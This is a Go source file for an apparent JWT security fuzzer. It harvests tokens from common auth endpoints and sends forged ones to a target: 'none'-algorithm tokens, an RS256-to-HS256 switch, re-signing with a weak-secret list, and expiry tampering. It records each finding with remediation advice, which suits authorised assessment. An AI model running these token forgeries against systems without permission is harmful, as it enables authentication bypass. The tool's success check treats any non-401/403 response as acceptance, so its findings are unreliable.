package jwt

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/ajkula/cyberraven/pkg/config"
	"github.com/ajkula/cyberraven/pkg/utils"
)

// JWTTestResult represents the result of JWT security testing
type JWTTestResult struct {
	// Test metadata
	StartTime time.Time     `json:"start_time"`
	EndTime   time.Time     `json:"end_time"`
	Duration  time.Duration `json:"duration"`
	TestType  string        `json:"test_type"`

	// Target information
	BaseURL   string `json:"base_url"`
	TestToken string `json:"test_token,omitempty"`

	// Test results
	TestsExecuted        int                `json:"tests_executed"`
	VulnerabilitiesFound []JWTVulnerability `json:"vulnerabilities_found"`
	TokensAnalyzed       []TokenAnalysis    `json:"tokens_analyzed"`

	// Performance metrics
	RequestsPerSecond float64 `json:"requests_per_second"`
	SuccessfulTests   int     `json:"successful_tests"`
	FailedTests       int     `json:"failed_tests"`
}

// JWTVulnerability represents a JWT-specific security vulnerability
type JWTVulnerability struct {
	Type        string `json:"type"`     // alg_none, weak_secret, expired_bypass, etc.
	Severity    string `json:"severity"` // low, medium, high, critical
	Endpoint    string `json:"endpoint"`
	Method      string `json:"method"`
	Description string `json:"description"`
	Evidence    string `json:"evidence"`
	Remediation string `json:"remediation"`
	RiskScore   int    `json:"risk_score"` // 0-100

	// JWT-specific fields
	OriginalToken  string `json:"original_token,omitempty"`
	MaliciousToken string `json:"malicious_token,omitempty"`
	AttackVector   string `json:"attack_vector"`
}

// TokenAnalysis represents analysis of a JWT token structure
type TokenAnalysis struct {
	Token          string                 `json:"token"`
	IsValid        bool                   `json:"is_valid"`
	Header         map[string]interface{} `json:"header"`
	Payload        map[string]interface{} `json:"payload"`
	Algorithm      string                 `json:"algorithm"`
	ExpirationTime *time.Time             `json:"expiration_time,omitempty"`
	IssuedAt       *time.Time             `json:"issued_at,omitempty"`
	SecurityIssues []string               `json:"security_issues"`
	RecommendedAlg string                 `json:"recommended_algorithm"`
}

// JWTFuzzer handles JWT security testing
type JWTFuzzer struct {
	config     *config.JWTAttackConfig
	target     *config.TargetConfig
	httpClient *utils.HTTPClient

	// JWT testing parameters
	testEndpoints []string
	weakSecrets   []string

	// Results tracking
	mu              sync.RWMutex
	testsExecuted   int
	vulnerabilities []JWTVulnerability
	tokensAnalyzed  []TokenAnalysis
	successfulTests int
	failedTests     int
}

// NewJWTFuzzer creates a new JWT security fuzzer
func NewJWTFuzzer(jwtConfig *config.JWTAttackConfig, targetConfig *config.TargetConfig) (*JWTFuzzer, error) {
	// Create default engine config for HTTP client
	engineConfig := &config.EngineConfig{
		MaxWorkers: 5, // Lower concurrency for JWT tests
		Timeout:    15 * time.Second,
		RateLimit:  5,
		MaxRetries: 2,
		RetryDelay: 1 * time.Second,
	}

	// Create enhanced HTTP client
	httpClient, err := utils.NewHTTPClient(targetConfig, engineConfig)
	if err != nil {
		return nil, fmt.Errorf("failed to create HTTP client: %w", err)
	}

	return &JWTFuzzer{
		config:        jwtConfig,
		target:        targetConfig,
		httpClient:    httpClient,
		testEndpoints: getDefaultJWTEndpoints(),
		weakSecrets:   getDefaultWeakSecrets(),
	}, nil
}

// Execute performs comprehensive JWT security testing
func (jf *JWTFuzzer) Execute(ctx context.Context) (*JWTTestResult, error) {
	startTime := time.Now()

	result := &JWTTestResult{
		StartTime: startTime,
		TestType:  "JWT Security Assessment",
		BaseURL:   jf.target.BaseURL,
	}

	// Discover JWT endpoints and tokens
	tokens, err := jf.discoverJWTTokens(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to discover JWT tokens: %w", err)
	}

	if len(tokens) == 0 {
		// No tokens found, create test scenarios
		tokens = jf.generateTestTokens()
	}

	// Analyze discovered tokens
	for _, token := range tokens {
		analysis := jf.analyzeToken(token)
		jf.recordTokenAnalysis(analysis)

		// Use first valid token as test token
		if analysis.IsValid && result.TestToken == "" {
			result.TestToken = token
		}
	}

	// Execute JWT-specific attacks
	if err := jf.executeJWTAttacks(ctx, tokens); err != nil {
		return nil, fmt.Errorf("failed to execute JWT attacks: %w", err)
	}

	// Finalize results
	jf.mu.RLock()
	result.TestsExecuted = jf.testsExecuted
	result.VulnerabilitiesFound = make([]JWTVulnerability, len(jf.vulnerabilities))
	copy(result.VulnerabilitiesFound, jf.vulnerabilities)
	result.TokensAnalyzed = make([]TokenAnalysis, len(jf.tokensAnalyzed))
	copy(result.TokensAnalyzed, jf.tokensAnalyzed)
	result.SuccessfulTests = jf.successfulTests
	result.FailedTests = jf.failedTests
	jf.mu.RUnlock()

	// Calculate metrics
	result.EndTime = time.Now()
	result.Duration = result.EndTime.Sub(result.StartTime)

	// Get HTTP client statistics
	_, _, requestsPerSecond := jf.httpClient.GetStats()
	result.RequestsPerSecond = requestsPerSecond

	return result, nil
}

// discoverJWTTokens attempts to discover JWT tokens from the target
func (jf *JWTFuzzer) discoverJWTTokens(ctx context.Context) ([]string, error) {
	var tokens []string

	// Test common JWT endpoints
	for _, endpoint := range jf.testEndpoints {
		select {
		case <-ctx.Done():
			return tokens, ctx.Err()
		default:
		}

		// Try to get JWT from endpoint
		token, err := jf.extractJWTFromEndpoint(ctx, endpoint)
		if err != nil {
			continue // Skip failed requests
		}

		if token != "" && jf.isValidJWTStructure(token) {
			tokens = append(tokens, token)
		}
	}

	return tokens, nil
}

// extractJWTFromEndpoint attempts to extract JWT token from an endpoint
func (jf *JWTFuzzer) extractJWTFromEndpoint(ctx context.Context, endpoint string) (string, error) {
	jf.incrementTestCount()

	// Try GET request first
	resp, err := jf.httpClient.Get(ctx, jf.target.BaseURL+endpoint)
	if err != nil {
		jf.recordFailedTest()
		return "", err
	}
	defer resp.Body.Close()

	jf.recordSuccessfulTest()

	// Look for JWT in Authorization header
	if auth := resp.Header.Get("Authorization"); auth != "" {
		if strings.HasPrefix(auth, "Bearer ") {
			token := strings.TrimPrefix(auth, "Bearer ")
			if jf.isValidJWTStructure(token) {
				return token, nil
			}
		}
	}

	// Look for JWT in response body (common in login responses)
	if strings.Contains(resp.BodyPreview, "token") ||
		strings.Contains(resp.BodyPreview, "jwt") ||
		strings.Contains(resp.BodyPreview, "access_token") {

		// Try to extract JWT from JSON response
		var jsonResp map[string]interface{}
		if json.Unmarshal([]byte(resp.BodyPreview), &jsonResp) == nil {
			if token, ok := jsonResp["token"].(string); ok && jf.isValidJWTStructure(token) {
				return token, nil
			}
			if token, ok := jsonResp["access_token"].(string); ok && jf.isValidJWTStructure(token) {
				return token, nil
			}
			if token, ok := jsonResp["jwt"].(string); ok && jf.isValidJWTStructure(token) {
				return token, nil
			}
		}
	}

	return "", nil
}

// executeJWTAttacks performs various JWT-specific attacks
func (jf *JWTFuzzer) executeJWTAttacks(ctx context.Context, tokens []string) error {
	if len(tokens) == 0 {
		return nil // No tokens to test
	}

	for _, token := range tokens {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		// Test algorithm confusion attacks
		if jf.config.TestAlgConfusion {
			jf.testAlgorithmConfusion(ctx, token)
		}

		// Test "none" algorithm bypass
		if jf.config.TestAlgNone {
			jf.testNoneAlgorithmBypass(ctx, token)
		}

		// Test weak secrets
		if jf.config.TestWeakSecrets {
			jf.testWeakSecrets(ctx, token)
		}

		// Test expiration bypass
		if jf.config.TestExpiration {
			jf.testExpirationBypass(ctx, token)
		}
	}

	return nil
}

// testAlgorithmConfusion tests for algorithm confusion vulnerabilities
func (jf *JWTFuzzer) testAlgorithmConfusion(ctx context.Context, originalToken string) {
	parts := strings.Split(originalToken, ".")
	if len(parts) != 3 {
		return
	}

	// Decode header
	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return
	}

	var header map[string]interface{}
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return
	}

	// Test algorithm confusion: Change RS256 to HS256
	if alg, ok := header["alg"].(string); ok && strings.HasPrefix(alg, "RS") {
		header["alg"] = "HS256"

		newHeaderBytes, _ := json.Marshal(header)
		newHeader := base64.RawURLEncoding.EncodeToString(newHeaderBytes)

		// Create malicious token
		maliciousToken := newHeader + "." + parts[1] + ".fake_signature"

		// Test malicious token
		if jf.testTokenValidation(ctx, maliciousToken) {
			vuln := JWTVulnerability{
				Type:           "algorithm_confusion",
				Severity:       "critical",
				Description:    "JWT algorithm confusion vulnerability (RS256 to HS256)",
				Evidence:       "Token with modified algorithm was accepted",
				Remediation:    "Strictly validate JWT algorithm in token verification",
				RiskScore:      95,
				OriginalToken:  originalToken,
				MaliciousToken: maliciousToken,
				AttackVector:   "Algorithm confusion (RS256 → HS256)",
			}
			jf.recordVulnerability(vuln)
		}
	}
}

// testNoneAlgorithmBypass tests for "none" algorithm bypass
func (jf *JWTFuzzer) testNoneAlgorithmBypass(ctx context.Context, originalToken string) {
	parts := strings.Split(originalToken, ".")
	if len(parts) != 3 {
		return
	}

	// Create header with "none" algorithm
	noneHeader := map[string]interface{}{
		"alg": "none",
		"typ": "JWT",
	}

	headerBytes, _ := json.Marshal(noneHeader)
	newHeader := base64.RawURLEncoding.EncodeToString(headerBytes)

	// Create token without signature
	maliciousToken := newHeader + "." + parts[1] + "."

	// Test malicious token
	if jf.testTokenValidation(ctx, maliciousToken) {
		vuln := JWTVulnerability{
			Type:           "none_algorithm_bypass",
			Severity:       "critical",
			Description:    "JWT accepts tokens with 'none' algorithm",
			Evidence:       "Token with 'none' algorithm was accepted without signature",
			Remediation:    "Reject tokens with 'none' algorithm in production",
			RiskScore:      90,
			OriginalToken:  originalToken,
			MaliciousToken: maliciousToken,
			AttackVector:   "None algorithm bypass",
		}
		jf.recordVulnerability(vuln)
	}
}

// testWeakSecrets tests for weak HMAC secrets
func (jf *JWTFuzzer) testWeakSecrets(ctx context.Context, originalToken string) {
	parts := strings.Split(originalToken, ".")
	if len(parts) != 3 {
		return
	}

	// Get configured weak secrets
	secrets := jf.config.WeakSecrets
	if len(secrets) == 0 {
		secrets = jf.weakSecrets
	}

	for _, secret := range secrets {
		// Try to forge token with weak secret
		maliciousToken := jf.forgeTokenWithSecret(originalToken, secret)
		if maliciousToken != "" {
			if jf.testTokenValidation(ctx, maliciousToken) {
				vuln := JWTVulnerability{
					Type:           "weak_secret",
					Severity:       "high",
					Description:    fmt.Sprintf("JWT uses weak HMAC secret: '%s'", secret),
					Evidence:       "Successfully forged token with weak secret",
					Remediation:    "Use strong, randomly generated HMAC secrets (256+ bits)",
					RiskScore:      85,
					OriginalToken:  originalToken,
					MaliciousToken: maliciousToken,
					AttackVector:   fmt.Sprintf("Weak secret brute force: '%s'", secret),
				}
				jf.recordVulnerability(vuln)
				return // Found weak secret, no need to test others
			}
		}
	}
}

// testExpirationBypass tests for expiration time bypass
func (jf *JWTFuzzer) testExpirationBypass(ctx context.Context, originalToken string) {
	parts := strings.Split(originalToken, ".")
	if len(parts) != 3 {
		return
	}

	// Decode payload
	payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return
	}

	var payload map[string]interface{}
	if err := json.Unmarshal(payloadBytes, &payload); err != nil {
		return
	}

	// Check if token has expiration
	if exp, ok := payload["exp"].(float64); ok {
		// Modify expiration to far future
		payload["exp"] = time.Now().Add(24 * time.Hour).Unix()

		newPayloadBytes, _ := json.Marshal(payload)
		newPayload := base64.RawURLEncoding.EncodeToString(newPayloadBytes)

		// Create malicious token (keeping original signature)
		maliciousToken := parts[0] + "." + newPayload + "." + parts[2]

		// Test malicious token
		if jf.testTokenValidation(ctx, maliciousToken) {
			vuln := JWTVulnerability{
				Type:           "expiration_bypass",
				Severity:       "medium",
				Description:    "JWT expiration time can be modified without invalidating token",
				Evidence:       "Token with modified expiration time was accepted",
				Remediation:    "Properly validate JWT signature after any payload modifications",
				RiskScore:      60,
				OriginalToken:  originalToken,
				MaliciousToken: maliciousToken,
				AttackVector:   fmt.Sprintf("Expiration bypass (original: %v)", time.Unix(int64(exp), 0)),
			}
			jf.recordVulnerability(vuln)
		}
	}
}

// Helper methods

func (jf *JWTFuzzer) isValidJWTStructure(token string) bool {
	parts := strings.Split(token, ".")
	return len(parts) == 3 && len(parts[0]) > 0 && len(parts[1]) > 0
}

func (jf *JWTFuzzer) analyzeToken(token string) TokenAnalysis {
	analysis := TokenAnalysis{
		Token:   token,
		IsValid: jf.isValidJWTStructure(token),
	}

	if !analysis.IsValid {
		analysis.SecurityIssues = append(analysis.SecurityIssues, "Invalid JWT structure")
		return analysis
	}

	parts := strings.Split(token, ".")

	// Decode header
	if headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0]); err == nil {
		json.Unmarshal(headerBytes, &analysis.Header)
		if alg, ok := analysis.Header["alg"].(string); ok {
			analysis.Algorithm = alg

			// Check for security issues
			if alg == "none" {
				analysis.SecurityIssues = append(analysis.SecurityIssues, "Uses 'none' algorithm")
			} else if strings.HasPrefix(alg, "HS") {
				analysis.RecommendedAlg = "RS256"
			}
		}
	}

	// Decode payload
	if payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1]); err == nil {
		json.Unmarshal(payloadBytes, &analysis.Payload)

		// Check expiration
		if exp, ok := analysis.Payload["exp"].(float64); ok {
			expTime := time.Unix(int64(exp), 0)
			analysis.ExpirationTime = &expTime
			if expTime.Before(time.Now()) {
				analysis.SecurityIssues = append(analysis.SecurityIssues, "Token is expired")
			}
		}

		// Check issued at
		if iat, ok := analysis.Payload["iat"].(float64); ok {
			iatTime := time.Unix(int64(iat), 0)
			analysis.IssuedAt = &iatTime
		}
	}

	return analysis
}

func (jf *JWTFuzzer) forgeTokenWithSecret(originalToken, secret string) string {
	parts := strings.Split(originalToken, ".")
	if len(parts) != 3 {
		return ""
	}

	// Create new signature with weak secret
	data := parts[0] + "." + parts[1]
	h := hmac.New(sha256.New, []byte(secret))
	h.Write([]byte(data))
	signature := base64.RawURLEncoding.EncodeToString(h.Sum(nil))

	return data + "." + signature
}

func (jf *JWTFuzzer) testTokenValidation(ctx context.Context, token string) bool {
	jf.incrementTestCount()

	// Test token against protected endpoints
	for _, endpoint := range jf.testEndpoints {
		headers := map[string]string{
			"Authorization": "Bearer " + token,
		}

		// Use Do method to pass headers
		resp, err := jf.httpClient.Do(ctx, "GET", jf.target.BaseURL+endpoint, nil, headers)
		if err != nil {
			continue
		}
		resp.Body.Close()

		// Check if token was accepted (not 401/403)
		if resp.StatusCode != 401 && resp.StatusCode != 403 {
			jf.recordSuccessfulTest()
			return true
		}
	}

	jf.recordFailedTest()
	return false
}

func (jf *JWTFuzzer) generateTestTokens() []string {
	// Generate sample JWT tokens for testing
	header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`))
	payload := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"test","exp":` + fmt.Sprintf("%d", time.Now().Add(time.Hour).Unix()) + `}`))

	return []string{
		header + "." + payload + ".fake_signature",
	}
}

func getDefaultJWTEndpoints() []string {
	return []string{
		"/login", "/auth", "/authenticate",
		"/api/auth", "/api/login", "/api/token",
		"/oauth", "/oauth/token",
		"/user", "/profile", "/me",
		"/admin", "/dashboard",
		"/api/user", "/api/profile",
	}
}

func getDefaultWeakSecrets() []string {
	return []string{
		"secret", "password", "123456",
		"jwt_secret", "your-256-bit-secret",
		"secretkey", "mysecret", "key",
		"test", "admin", "root",
		"", " ", "null",
	}
}

// Thread-safe methods

func (jf *JWTFuzzer) incrementTestCount() {
	jf.mu.Lock()
	jf.testsExecuted++
	jf.mu.Unlock()
}

func (jf *JWTFuzzer) recordSuccessfulTest() {
	jf.mu.Lock()
	jf.successfulTests++
	jf.mu.Unlock()
}

func (jf *JWTFuzzer) recordFailedTest() {
	jf.mu.Lock()
	jf.failedTests++
	jf.mu.Unlock()
}

func (jf *JWTFuzzer) recordVulnerability(vuln JWTVulnerability) {
	jf.mu.Lock()
	jf.vulnerabilities = append(jf.vulnerabilities, vuln)
	jf.mu.Unlock()
}

func (jf *JWTFuzzer) recordTokenAnalysis(analysis TokenAnalysis) {
	jf.mu.Lock()
	jf.tokensAnalyzed = append(jf.tokensAnalyzed, analysis)
	jf.mu.Unlock()
}

// Close cleans up resources used by the fuzzer
func (jf *JWTFuzzer) Close() {
	if jf.httpClient != nil {
		jf.httpClient.Close()
	}
}
